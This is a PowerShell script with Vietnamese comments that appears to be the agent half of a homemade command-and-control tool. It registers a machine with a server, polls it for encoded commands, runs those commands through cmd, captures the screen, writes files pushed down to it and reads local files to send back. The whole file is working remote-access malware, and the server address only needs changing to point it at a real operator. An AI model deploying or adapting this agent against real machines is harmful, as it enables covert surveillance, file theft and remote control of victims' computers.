# --- CẤU HÌNH ---
$server_url = "http://127.0.0.1:8080"
$agent_id = $null
$sleep_time = 3

# Nạp thư viện đồ họa cho tính năng screenshot
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# --- HÀM CHỨC NĂNG ---

function Register-Agent {
    $hostname = $env:COMPUTERNAME
    try {
        $response = Invoke-RestMethod -Uri "$server_url/reg" -Method POST -Body @{name=$hostname}
        return $response
    } catch { return $null }
}

function Get-Task {
    try {
        $task = Invoke-RestMethod -Uri "$server_url/tasks/$agent_id" -Method GET
        return $task
    } catch { return $null }
}

function Send-Result ($output_str) {
    try {
        # Mã hóa toàn bộ kết quả sang Base64 để bảo mật đường truyền
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($output_str)
        $encoded = [System.Convert]::ToBase64String($bytes)
        
        Invoke-RestMethod -Uri "$server_url/results/$agent_id" -Method POST -Body @{result=$encoded}
    } catch {}
}

function Capture-Screen {
    try {
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        
        $ms = New-Object System.IO.MemoryStream
        $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $base64_img = [Convert]::ToBase64String($ms.ToArray())
        
        $graphics.Dispose(); $bmp.Dispose(); $ms.Dispose()
        return "[IMAGE] $base64_img"
    } catch { return "Error capturing screen: $_" }
}

# --- MAIN LOOP ---

Write-Host "[*] Starting Agent (Full Features)..."
$agent_id = Register-Agent

if (-not $agent_id) { Write-Host "[-] Failed."; Exit }

Write-Host "[+] Registered ID: $agent_id"

while ($true) {
    $encoded_task = Get-Task
    
    if (-not [string]::IsNullOrEmpty($encoded_task)) {
        try {
            # Giải mã lệnh từ Server
            $bytes = [System.Convert]::FromBase64String($encoded_task)
            $cmd_full = [System.Text.Encoding]::UTF8.GetString($bytes)
            
            Write-Host "[*] Processing task..."
            
            # Tách chuỗi lệnh để phân loại (ví dụ: upload C:\file.exe <base64>)
            $parts = $cmd_full -split " "
            $type = $parts[0]

            if ($type -eq "screenshot") {
                $result = Capture-Screen
            }
            elseif ($type -eq "upload") {
                # Cú pháp nhận được: upload <đường_dẫn_lưu> <nội_dung_base64>
                if ($parts.Count -eq 3) {
                    $path = $parts[1]
                    $content = $parts[2]
                    try {
                        $file_bytes = [System.Convert]::FromBase64String($content)
                        # Ghi byte array ra file
                        [System.IO.File]::WriteAllBytes($path, $file_bytes)
                        $result = "File uploaded successfully to: $path"
                    } catch { $result = "Upload failed: $_" }
                }
            }
            elseif ($type -eq "download") {
                # Cú pháp nhận được: download <đường_dẫn_file_cần_lấy>
                if ($parts.Count -ge 2) {
                    $path = $parts[1]
                    try {
                        # Đọc file dưới dạng byte array
                        $file_bytes = [System.IO.File]::ReadAllBytes($path)
                        $b64 = [System.Convert]::ToBase64String($file_bytes)
                        $filename = [System.IO.Path]::GetFileName($path)
                        
                        # Trả về theo định dạng quy ước: [FILE] <tên> <dữ_liệu>
                        $result = "[FILE] $filename $b64"
                    } catch { $result = "Download failed: $_" }
                }
            }
            else {
                # Các lệnh CMD/PowerShell thông thường
                $result = cmd /c $cmd_full 2>&1 | Out-String
            }

        } catch {
            $result = "Runtime Error: $_"
        }

        Send-Result -output_str $result
    }
    
    Start-Sleep -Seconds $sleep_time
}